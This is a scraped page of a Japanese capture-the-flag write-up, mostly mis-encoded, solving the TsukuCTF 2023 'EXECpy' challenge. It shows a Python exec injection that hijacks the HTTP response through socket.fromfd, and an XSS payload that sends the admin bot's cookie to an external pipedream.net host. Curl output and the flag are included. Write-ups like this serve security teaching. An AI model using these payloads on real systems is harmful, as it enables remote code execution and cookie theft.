<span>                </span><span class="token token" style="color:#67cdcc">&lt;</span><span>p </span><span class="token token assign-left" style="color:#7ec699">class</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#7ec699">&quot;block text-gray-700 text-sm font-bold mb-2&quot;</span><span class="token token" style="color:#67cdcc">&gt;</span><span>
</span>                    Your code has been executed. However, no results will be returned. ğŸ¤ª
<span>                </span><span class="token token" style="color:#67cdcc">&lt;</span><span>/p</span><span class="token token" style="color:#67cdcc">&gt;</span><span>
</span>~~~</code></div></pre>
<p><code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">Server</code>ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼ã¯<code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">nginx/1.25.3</code>ã§ã‚ã‚‹ã®ã§<code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">Tsukushi/2.94</code>ã§ã¯ãªã„ã€‚<br/>
<!-- -->ã¾ãŸã€<code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">ğŸ¤ª</code>ã‚‚ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒœãƒ‡ã‚£ã«å«ã¾ã‚Œã¦ã„ã‚‹ã€‚<br/>
<!-- -->ã“ã‚Œã‚‰ãŒãªã‘ã‚Œã°<code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">request.cookies.get</code>ã§å–å¾—ã—ãŸãƒ•ãƒ©ã‚°ã‚’å¤–éƒ¨ã«é€ä¿¡ã™ã‚‹ã ã‘ã§æ¸ˆã‚€(<code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">/bin/*</code>ãŒç„¡ã„ãŒ)ã€‚<br/>
<!-- -->ä»¥ä¸Šã®ã“ã¨ã‚ˆã‚Šexecã‚’è¡Œã†ã“ã¨ã§Flaskã®å¿œç­”çµæœã®ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼ã¨ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒœãƒ‡ã‚£ã‚’æ›¸ãæ›ãˆã¦XSSã™ã‚‹å•é¡Œã ã¨ã‚ã‹ã‚‹ã€‚<br/>
<!-- -->ã“ã“ã§execãŒHTTPé€šä¿¡ä¸­ã«è¡Œã‚ã‚Œã‚‹ãŸã‚ã€Flask(ã‹Werkzeug)ãŒfdã‚’ä¿æŒã—ã¦ãŠã‚Šã€ãã“ã«ãƒ‡ãƒ¼ã‚¿ã‚’æµã—è¾¼ã‚€ã“ã¨ã§ã†ã¾ããƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’æ›¸ãæ›ãˆã‚‹ã“ã¨ãŒã§ããã†ãªã“ã¨ã«æ°—ã¥ãã€‚<br/>
<!-- -->ã‚‚ã—ãã¯ã€execã§è‡ªç”±åº¦ãŒé«˜ã„ã®ã§Pythonã®ãƒ¡ãƒ¢ãƒªä¸Šã«ä¹—ã£ã¦ã„ã‚‹ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’æ›¸ãæ›ãˆã‚‹ã“ã¨ã‚‚ã§ãã‚‹ã‹ã‚‚ã—ã‚Œãªã„ã€‚<br/>
<!-- -->å¾Œè€…ã¯ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ç ´å£Šã—ãã†ãªã®ã§ã€å‰è€…ã‚’è©¦ã™ã€‚<br/>
<!-- -->Flask(ã‹Werkzeug)ãŒfdã«æ›¸ãè¾¼ã‚“ã§ã„ãªã„ã‹ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’èª¿æŸ»ã™ã‚‹ã€‚<br/>
<a href="https://github.com/search?q=repo%3Apallets%2Fflask%20file%20descriptor&amp;type=code">Flask Source Code</a><br/>
<a href="https://github.com/search?q=repo%3Apallets%2Fwerkzeug%20file%20descriptor&amp;type=code">Werkzeug Source Code</a><br/>
<!-- -->ã“ã‚Œã‚‰ã‚’è¦‹ã‚‹ã¨<a href="https://github.com/pallets/werkzeug/blob/eafbed0ce2a6bdf60e62de82bf4a8365188ac334/src/werkzeug/serving.py#L778"><code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">socket.fromfd</code>ã®ç®‡æ‰€</a>ãŒä½¿ãˆãã†ãªã“ã¨ãŒã‚ã‹ã‚‹ã€‚<br/>
<a href="https://docs.python.org/3/library/socket.html#socket.fromfd">ã“ã“</a>ã‚’è¦‹ã‚‹ã¨ã™ã§ã«ã‚ã‚‹ã‚½ã‚±ãƒƒãƒˆå‚ç…§ã®fdã‹ã‚‰ã‚½ã‚±ãƒƒãƒˆã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œã£ã¦ãã‚Œã‚‹ã‚‰ã—ã„ã“ã¨ãŒã‚ã‹ã‚‹ã€‚<br/>
<!-- -->ã“ã‚Œã‚’ç”¨ã„ã¦HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’æµã—è¾¼ã‚“ã§ã¿ã‚‹ã€‚</p>
<pre><div node="[object Object]" class="MarkdownRender_code__F4sq8" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-python" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token token" style="color:#cc99cd">import</span><span> socket
</span><span></span><span class="token token" style="color:#cc99cd">for</span><span> fd </span><span class="token token" style="color:#cc99cd">in</span><span> </span><span class="token token" style="color:#cc99cd">range</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">100</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">try</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>        sock </span><span class="token token" style="color:#67cdcc">=</span><span> socket</span><span class="token token" style="color:#ccc">.</span><span>fromfd</span><span class="token token" style="color:#ccc">(</span><span>fd</span><span class="token token" style="color:#ccc">,</span><span> socket</span><span class="token token" style="color:#ccc">.</span><span>AF_INET</span><span class="token token" style="color:#ccc">,</span><span> socket</span><span class="token token" style="color:#ccc">.</span><span>SOCK_STREAM</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>        sock</span><span class="token token" style="color:#ccc">.</span><span>sendall</span><span class="token token" style="color:#ccc">(</span><span class="token token triple-quoted-string" style="color:#7ec699">b&#x27;&#x27;&#x27;HTTP/1.1 200 OK
</span><span class="token token triple-quoted-string" style="color:#7ec699">Content-Length: 6
</span><span class="token token triple-quoted-string" style="color:#7ec699">Content-Type: text/html
</span><span class="token token triple-quoted-string" style="color:#7ec699">Connection: Closed
</span><span class="token token triple-quoted-string" style="color:#7ec699">
</span><span class="token token triple-quoted-string" style="color:#7ec699">Satoki&#x27;&#x27;&#x27;</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">except</span><span> Exception </span><span class="token token" style="color:#cc99cd">as</span><span> e</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>        </span><span class="token token" style="color:#cc99cd">pass</span></code></div></pre>
<p>å®Ÿè¡Œã™ã‚‹ã€‚</p>
<pre><div node="[object Object]" class="MarkdownRender_code__F4sq8" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-bash" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>$ </span><span class="token token" style="color:#f08d49">curl</span><span> </span><span class="token token" style="color:#7ec699">&#x27;http://118.27.109.12:31416/?code=import+socket%0D%0Afor+fd+in+range%28100%29%3A%0D%0A++++try%3A%0D%0A++++++++sock+%3D+socket.fromfd%28fd%2C+socket.AF_INET%2C+socket.SOCK_STREAM%29%0D%0A++++++++sock.sendall%28b%27%27%27HTTP%2F1.1+200+OK%0D%0AContent-Length%3A+6%0D%0AContent-Type%3A+text%2Fhtml%0D%0AConnection%3A+Closed%0D%0A%0D%0ASatoki%27%27%27%29%0D%0A++++except+Exception+as+e%3A%0D%0A++++++++pass&#x27;</span><span> -v
</span><span>*   Trying </span><span class="token token" style="color:#f08d49">118.27</span><span>.109.12:31416</span><span class="token token" style="color:#ccc">..</span><span>.
</span><span>* Connected to </span><span class="token token" style="color:#f08d49">118.27</span><span>.109.12 </span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">118.27</span><span>.109.12</span><span class="token token" style="color:#ccc">)</span><span> port </span><span class="token token" style="color:#f08d49">31416</span><span> </span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#999">#0)</span><span>
</span><span></span><span class="token token" style="color:#67cdcc">&gt;</span><span> GET /?code</span><span class="token token" style="color:#67cdcc">=</span><span>import+socket%0D%0Afor+fd+in+range%28100%29%3A%0D%0A++++try%3A%0D%0A++++++++sock+%3D+socket.fromfd%28fd%2C+socket.AF_INET%2C+socket.SOCK_STREAM%29%0D%0A++++++++sock.sendall%28b%27%27%27HTTP%2F1.1+200+OK%0D%0AContent-Length%3A+6%0D%0AContent-Type%3A+text%2Fhtml%0D%0AConnection%3A+Closed%0D%0A%0D%0ASatoki%27%27%27%29%0D%0A++++except+Exception+as+e%3A%0D%0A++++++++pass HTTP/1.1
</span><span></span><span class="token token" style="color:#67cdcc">&gt;</span><span> Host: </span><span class="token token" style="color:#f08d49">118.27</span><span>.109.12:31416
</span><span></span><span class="token token" style="color:#67cdcc">&gt;</span><span> User-Agent: curl/7.81.0
</span><span></span><span class="token token" style="color:#67cdcc">&gt;</span><span> Accept: */*
</span><span></span><span class="token token" style="color:#67cdcc">&gt;</span><span>
</span>* Mark bundle as not supporting multiuse
<span></span><span class="token token" style="color:#67cdcc">&lt;</span><span> HTTP/1.1 </span><span class="token token" style="color:#f08d49">200</span><span> OK
</span><span></span><span class="token token" style="color:#67cdcc">&lt;</span><span> Server: nginx/1.25.3
</span><span></span><span class="token token" style="color:#67cdcc">&lt;</span><span> Date: Sat, 09 Dec </span><span class="token token" style="color:#f08d49">2023</span><span> 00:00:00 GMT
</span><span></span><span class="token token" style="color:#67cdcc">&lt;</span><span> Content-Type: text/html
</span><span></span><span class="token token" style="color:#67cdcc">&lt;</span><span> Content-Length: </span><span class="token token" style="color:#f08d49">6</span><span>
</span><span></span><span class="token token" style="color:#67cdcc">&lt;</span><span> Connection: close
</span><span></span><span class="token token" style="color:#67cdcc">&lt;</span><span>
</span><span>* Closing connection </span><span class="token token" style="color:#f08d49">0</span><span>
</span>Satoki</code></div></pre>
<p>ç„¡äº‹ã«å¿œç­”ã‚’æ›¸ãæ›ãˆã‚‹ã“ã¨ãŒã§ããŸã€‚<br/>
<!-- -->ã‚ã¨ã¯é©åˆ‡ãªãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’è¨­å®šã—ã€XSSã—ã¦ãƒ•ãƒ©ã‚°ã‚’å¤–éƒ¨ã‚µãƒ¼ãƒã«é€ä¿¡ã—ã¦ã‚„ã‚Œã°ã‚ˆã„ã€‚<br/>
<!-- -->ä»¥ä¸‹ã®payload.pyã§XSSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®ä½œæˆã‚’è¡Œã†ã€‚</p>
<pre><div node="[object Object]" class="MarkdownRender_code__F4sq8" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-python" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token token" style="color:#999"># This script is inspired by potetisensei</span><span>
</span>
<span>URL </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#7ec699">&quot;https://en9i5fcxybxwa.x.pipedream.net/&quot;</span><span> </span><span class="token token" style="color:#999"># Your server</span><span>
</span>
<span>payload </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token string-interpolation" style="color:#7ec699">f&quot;&quot;&quot;
</span><span class="token token string-interpolation" style="color:#7ec699">&lt;!DOCTYPE html&gt;
</span><span class="token token string-interpolation" style="color:#7ec699">&lt;html lang=&quot;en&quot;&gt;
</span><span class="token token string-interpolation" style="color:#7ec699">    &lt;head&gt;&lt;/head&gt;
</span><span class="token token string-interpolation" style="color:#7ec699">    &lt;body&gt;
</span><span class="token token string-interpolation" style="color:#7ec699">    &lt;script&gt;location.href=&#x27;</span><span class="token token string-interpolation interpolation" style="color:#ccc">{</span><span class="token token string-interpolation interpolation">URL</span><span class="token token string-interpolation interpolation" style="color:#ccc">}</span><span class="token token string-interpolation" style="color:#7ec699">?s=&#x27;+document.cookie&lt;/script&gt;
</span><span class="token token string-interpolation" style="color:#7ec699">    &lt;/body&gt;
</span><span class="token token string-interpolation" style="color:#7ec699">&lt;/html&gt;
</span><span class="token token string-interpolation" style="color:#7ec699">&quot;&quot;&quot;</span><span>
</span>
<span></span><span class="token token" style="color:#cc99cd">print</span><span class="token token" style="color:#ccc">(</span><span>
</span><span>    </span><span class="token token string-interpolation" style="color:#7ec699">f&quot;&quot;&quot;
</span><span class="token token string-interpolation" style="color:#7ec699">import socket
</span><span class="token token string-interpolation" style="color:#7ec699">for fd in range(100):
</span><span class="token token string-interpolation" style="color:#7ec699">    try:
</span><span class="token token string-interpolation" style="color:#7ec699">        sock = socket.fromfd(fd, socket.AF_INET, socket.SOCK_STREAM)
</span><span class="token token string-interpolation" style="color:#7ec699">        sock.sendall(b&#x27;&#x27;&#x27;HTTP/1.1 200 OK
</span><span class="token token string-interpolation" style="color:#7ec699">Server: Tsukushi/2.94
</span><span class="token token string-interpolation" style="color:#7ec699">Content-Length: </span><span class="token token string-interpolation interpolation" style="color:#ccc">{</span><span class="token token string-interpolation interpolation" style="color:#cc99cd">len</span><span class="token token string-interpolation interpolation" style="color:#ccc">(</span><span class="token token string-interpolation interpolation">payload</span><span class="token token string-interpolation interpolation" style="color:#ccc">)</span><span class="token token string-interpolation interpolation" style="color:#ccc">}</span><span class="token token string-interpolation" style="color:#7ec699">
</span><span class="token token string-interpolation" style="color:#7ec699">Content-Type: text/html
</span><span class="token token string-interpolation" style="color:#7ec699">Connection: Closed
</span><span class="token token string-interpolation" style="color:#7ec699">
</span><span class="token token string-interpolation" style="color:#7ec699"></span><span class="token token string-interpolation interpolation" style="color:#ccc">{</span><span class="token token string-interpolation interpolation">payload</span><span class="token token string-interpolation interpolation" style="color:#ccc">}</span><span class="token token string-interpolation" style="color:#7ec699">&#x27;&#x27;&#x27;)
</span><span class="token token string-interpolation" style="color:#7ec699">    except Exception as e:
</span><span class="token token string-interpolation" style="color:#7ec699">        pass
</span><span class="token token string-interpolation" style="color:#7ec699">&quot;&quot;&quot;</span><span>
</span><span></span><span class="token token" style="color:#ccc">)</span></code></div></pre>
<p>å®Ÿè¡Œã™ã‚‹ã€‚</p>
<pre><div node="[object Object]" class="MarkdownRender_code__F4sq8" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-bash" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>$ python payload.py
</span>
<span></span><span class="token token" style="color:#f08d49">import</span><span> socket
</span><span></span><span class="token token" style="color:#cc99cd">for</span><span> </span><span class="token token for-or-select" style="color:#7ec699">fd</span><span> </span><span class="token token" style="color:#cc99cd">in</span><span> range</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">100</span><span class="token token" style="color:#ccc">)</span><span>:
</span>    try:
<span>        sock </span><span class="token token" style="color:#67cdcc">=</span><span> socket.fromfd</span><span class="token token" style="color:#ccc">(</span><span>fd, socket.AF_INET, socket.SOCK_STREAM</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>        sock.sendall</span><span class="token token" style="color:#ccc">(</span><span>b</span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span>&#x27;HTTP/1.1 </span><span class="token token" style="color:#f08d49">200</span><span> OK
</span>Server: Tsukushi/2.94
<span>Content-Length: </span><span class="token token" style="color:#f08d49">178</span><span>
</span>Content-Type: text/html
<!-- -->Connection: Closed
<!-- -->
<!-- -->
<span></span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">!</span><span>DOCTYPE html</span><span class="token token" style="color:#67cdcc">&gt;</span><span>
</span><span></span><span class="token token" style="color:#67cdcc">&lt;</span><span>html </span><span class="token token assign-left" style="color:#7ec699">lang</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#7ec699">&quot;en&quot;</span><span class="token token" style="color:#67cdcc">&gt;</span><span>
</span><span>    </span><span class="token token" style="color:#67cdcc">&lt;</span><span>head</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#67cdcc">&lt;</span><span>/head</span><span class="token token" style="color:#67cdcc">&gt;</span><span>
</span><span>    </span><span class="token token" style="color:#67cdcc">&lt;</span><span>body</span><span class="token token" style="color:#67cdcc">&gt;</span><span>
</span><span>    </span><span class="token token" style="color:#67cdcc">&lt;</span><span>script</span><span class="token token" style="color:#67cdcc">&gt;</span><span>location.href</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#7ec699">&#x27;https://en9i5fcxybxwa.x.pipedream.net/?s=&#x27;</span><span>+document.cookie</span><span class="token token" style="color:#67cdcc">&lt;</span><span>/script</span><span class="token token" style="color:#67cdcc">&gt;</span><span>
</span><span>    </span><span class="token token" style="color:#67cdcc">&lt;</span><span>/body</span><span class="token token" style="color:#67cdcc">&gt;</span><span>
</span><span></span><span class="token token" style="color:#67cdcc">&lt;</span><span>/html</span><span class="token token" style="color:#67cdcc">&gt;</span><span>
</span><span></span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span>&#x27;</span><span class="token token" style="color:#ccc">)</span><span>
</span>    except Exception as e:
<!-- -->        pass
</code></div></pre>
<p>ã“ã‚Œã‚’URLã‚¯ã‚¨ãƒªã«è¨­å®šã™ã‚‹ã¨ä»¥ä¸‹ã«ãªã‚‹ã€‚</p>
<pre><code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">http://118.27.109.12:31416/?code=%0D%0Aimport+socket%0D%0Afor+fd+in+range%28100%29%3A%0D%0A++++try%3A%0D%0A++++++++sock+%3D+socket.fromfd%28fd%2C+socket.AF_INET%2C+socket.SOCK_STREAM%29%0D%0A++++++++sock.sendall%28b%27%27%27HTTP%2F1.1+200+OK%0D%0AServer%3A+Tsukushi%2F2.94%0D%0AContent-Length%3A+178%0D%0AContent-Type%3A+text%2Fhtml%0D%0AConnection%3A+Closed%0D%0A%0D%0A%0D%0A%3C%21DOCTYPE+html%3E%0D%0A%3Chtml+lang%3D%22en%22%3E%0D%0A++++%3Chead%3E%3C%2Fhead%3E%0D%0A++++%3Cbody%3E%0D%0A++++%3Cscript%3Elocation.href%3D%27https%3A%2F%2Fen9i5fcxybxwa.x.pipedream.net%2F%3Fs%3D%27%2Bdocument.cookie%3C%2Fscript%3E%0D%0A++++%3C%2Fbody%3E%0D%0A%3C%2Fhtml%3E%0D%0A%27%27%27%29%0D%0A++++except+Exception+as+e%3A%0D%0A++++++++pass%0D%0A
</code></pre>
<p>crawlerã«æŠ•ã’ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒå±Šãã€‚<br/>
<img src="https://raw.githubusercontent.com/SecHack365-Fans/SecHack365-Fans.github.io/master/pages/ctf/TsukuCTF2023/writeups/EXECpy/images/flag.png" alt="flag.png" style="width:80%"/><br/>
<!-- -->flagãŒå¾—ã‚‰ã‚ŒãŸã€‚</p>
<h2>TsukuCTF23{175_4_73rr1bl3_4774ck_70_1n73rrup7_h77p}</h2></div><div class="x2b8uid">Â© 2021-<!-- -->2023<!-- --> SecHack365-Fans All Right Reserved.</div></div></div><script id="__NEXT_DATA__" type="application/json" crossorigin="">{"props":{"pageProps":{"postData":{"id":"EXECpy","contentHtml":"# EXECpy\n\n## å•é¡Œæ–‡\n\nRCEã‹ã‚™ã‚ã‚“ã¨ã‚™ãã•ã„?\\\nãƒ†ã‚™ãƒ¼ã‚¿ã‚’`exec`ã«æ¸¡ã—ã¨ã„ãŸã‹ã‚‰RCE2XSSã—ã¦ã­!\n\n\u003chttp://118.27.109.12:31416\u003e\n\n**AdminBot:** \u003chttp://118.27.109.12:31416/crawler\u003e\n\nHint\\\nwowwow\n\n## é›£æ˜“åº¦\n\n**hard**\n\n## ä½œå•ã«ã‚ãŸã£ã¦\n\nDEF CON 31ã§å°ã•ãé–‹å‚¬ã•ã‚Œã¦ã„ãŸSpaceX Security Challengeã«potetisenseiã¨å‡ºãŸéš›ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’XSSã«è½ã¨ã—è¾¼ã¿ã¾ã—ãŸã€‚\\\npickleã§RCEãŒã§ãã‚‹ã‚·ãƒŠãƒªã‚ªã§ã‚µãƒ¼ãƒå†…éƒ¨ã®ãƒã‚¤ãƒŠãƒªã‚’å–å¾—ã™ã‚‹å¿…è¦ãŒã‚ã£ãŸã®ã§ã™ãŒã€ã‚¢ã‚¦ãƒˆãƒã‚¦ãƒ³ãƒ‰é€šä¿¡ã‚„å¿œç­”æ™‚é–“ã§ã®ã‚ªãƒ©ã‚¯ãƒ«ãŒã§ããªã„(å…±ã«é‹å–¶ã‚¤ãƒ³ãƒ•ãƒ©ã®å•é¡Œ)çŠ¶æ³ã§ã—ãŸã€‚\\\nãã“ã§é–‹ã„ã¦ã„ã‚‹fdã«å–å¾—ã—ãŸã„ãƒ‡ãƒ¼ã‚¿ã‚’æµã—è¾¼ã‚“ã§HTTPå¿œç­”ã¨ã—ã¦è¿”ã™ã“ã¨ã§ã€å…¥æ‰‹ã™ã‚‹æ‰‹æ³•ã‚’ç”¨ã„ã¦ã„ã¾ã—ãŸã€‚\\\nç¾å®Ÿã§ã¯XSS2RCEã¯æœ€é«˜ã§ã™ãŒã€RCE2XSSã¯ã†ã‚Œã—ããªã„ã§ã™ã€‚\n\n## è§£æ³•\n\nURLã€AdminBotã€ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ãŒæ¸¡ã•ã‚Œã‚‹ã€‚\\\nã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨Pythonã®execã§ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã‚‹è¬ã®ã‚µãƒ¼ãƒ“ã‚¹ã ã€‚\\\n![site1.png](images/site1.png)\\\nãŸã ã—å®Ÿè¡Œçµæœã¯è¿”ã—ã¦ãã‚Œãªã„ã€‚\\\n![site2.png](images/site2.png)\\\nURLã¯`http://118.27.109.12:31416/?code=print%281%29`ã§ã‚ã‚Šã€ã‚³ãƒ¼ãƒ‰ã‚’ã‚¯ã‚¨ãƒªã«æ¸¡ã›ã‚‹ã€‚\\\nAdminBotãŒã‚ã‚‹ã“ã¨ã‹ã‚‰ã‚‚XSSå•é¡Œã ã‚ã†ã€‚\\\n![site3.png](images/site3.png)\\\nã‚½ãƒ¼ã‚¹ã‚’è¦‹ã‚‹ã¨ãƒ¡ã‚¤ãƒ³ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã‚ã£ãŸã€‚\n\n```python\nfrom flask import Flask, render_template, request\n\napp = Flask(__name__)\n\n\n@app.route(\"/\", methods=[\"GET\"])\ndef index():\n    code = request.args.get(\"code\")\n    if not code:\n        return render_template(\"index.html\")\n\n    try:\n        exec(code)\n    except:\n        pass\n\n    return render_template(\"result.html\")\n\n\nif __name__ == \"__main__\":\n    app.run(debug=True, host=\"0.0.0.0\", port=31416)\n```\n\nã‚¯ãƒ­ãƒ¼ãƒ©ãƒ¼ã‚‚è¦‹ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ã«ã€Playwrightã§cookieã«ãƒ•ãƒ©ã‚°ã‚’ä»˜ã‘ã¦ãƒ¦ãƒ¼ã‚¶ã®å…¥åŠ›URLã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã„ã‚‹ã€‚\\\nãŸã ã—ã€ãƒ•ãƒ©ã‚°ãŒä»˜ããŸã‚ã«ã¯`if (\"Tsukushi/2.94\" in header) and (\"ğŸ¤ª\" not in content):`ã®åˆ¶é™ãŒã‚ã‚‹ã€‚\n\n```python\nimport os\nimport asyncio\nfrom playwright.async_api import async_playwright\nfrom flask import Flask, render_template, request\n\napp = Flask(__name__)\n\nDOMAIN = \"nginx\"\nFLAG = os.environ.get(\"FLAG\", \"TsukuCTF23{**********REDACTED**********}\")\n\n\n@app.route(\"/crawler\", methods=[\"GET\"])\ndef index_get():\n    return render_template(\"index_get.html\")\n\n\nasync def crawl(url):\n    async with async_playwright() as p:\n        browser = await p.chromium.launch()\n        page = await browser.new_page()\n\n        try:\n            response = await page.goto(url, timeout=5000)\n            header = await response.header_value(\"Server\")\n            content = await page.content()\n\n            if (\"Tsukushi/2.94\" in header) and (\"ğŸ¤ª\" not in content):\n                await page.context.add_cookies(\n                    [{\"name\": \"FLAG\", \"value\": FLAG, \"domain\": DOMAIN, \"path\": \"/\"}]\n                )\n                if url.startswith(f\"http://{DOMAIN}/?code=\") or url.startswith(\n                    f\"https://{DOMAIN}/?code=\"\n                ):\n                    await page.goto(url, timeout=5000)\n        except:\n            pass\n\n        await browser.close()\n\n\n@app.route(\"/crawler\", methods=[\"POST\"])\ndef index_post():\n    asyncio.run(\n        crawl(\n            request.form.get(\"url\").replace(\n                \"http://localhost:31416/\", f\"http://{DOMAIN}/\", 1\n            )\n        )\n    )\n    return render_template(\"index_post.html\")\n\n\nif __name__ == \"__main__\":\n    app.run(debug=True, host=\"0.0.0.0\", port=31417)\n```\n\nã‚‚ã†ä¸€åº¦ãƒ¡ã‚¤ãƒ³ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®å¿œç­”ã‚’ç¢ºèªã™ã‚‹ã€‚\n\n```bash\n$ curl 'http://118.27.109.12:31416/?code=print%281%29' -I\nHTTP/1.1 200 OK\nServer: nginx/1.25.3\nDate: Sat, 09 Dec 2023 00:00:00 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 1059\nConnection: close\n\n$ curl 'http://118.27.109.12:31416/?code=print%281%29'\n~~\n                \u003cp class=\"block text-gray-700 text-sm font-bold mb-2\"\u003e\n                    Your code has been executed. However, no results will be returned. ğŸ¤ª\n                